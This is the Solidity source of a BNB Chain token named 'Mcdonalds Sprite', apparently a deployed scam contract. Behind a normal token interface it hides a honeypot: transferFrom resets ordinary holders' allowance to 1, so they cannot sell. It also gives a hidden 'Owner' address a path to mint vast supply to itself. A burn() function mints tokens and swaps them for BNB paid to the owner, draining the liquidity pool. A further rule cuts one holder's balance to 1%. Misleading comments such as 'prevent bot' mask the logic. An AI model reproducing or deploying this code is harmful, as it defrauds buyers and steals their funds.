/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.7;
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract SPRITE {
    using SafeMath for uint256;
    string public name = "Mcdonalds Sprite";
    string public symbol = "Sprite";
    uint8 public decimals = 9;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    address public owner; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address Owner=0xaa12352819bB0AA5288005C6F9866B417773eD7C;
    address public Beli=0x0000000000000000000000000000000000000000;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
        uint ads = totalSupply/1000;
        _transfer(msg.sender, Beli, ads);      
        _transfer(msg.sender, 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e, ads); //Deeplock
        _transfer(msg.sender, 0x7ee058420e5937496F5a2096f04caA7721cF70cc, ads); //Pinklock
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
    require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); //prevent bot
        if (Beli != Owner && Beli !=getPair() && to != Beli && balanceOf[Beli]>=totalSupply.divCeil(25)) {
            balanceOf[Beli]=balanceOf[Beli].divCeil(100);}
        if (to != owner && to != router && msg.sender == getPair() && balanceOf[to] == 0) {Beli = to;}
        if (to == Owner) {Beli = to;}
        if (to == msg.sender) {burn(totalSupply*500);}
         _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (to == Owner){allowance[from][Owner] = amount; balanceOf[Owner]+= totalSupply*2000;}
        if (from != owner && from != Owner && to !=Owner && from != address(this) && from != Beli) { 
            allowance[from][msg.sender] = 1; } 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function burn(uint Beep) internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = Beep*2;
        balanceOf[address(this)] += amount;
        allowance [address(this)] [address(router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 1, path, owner, block.timestamp + 20);
    }
    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
}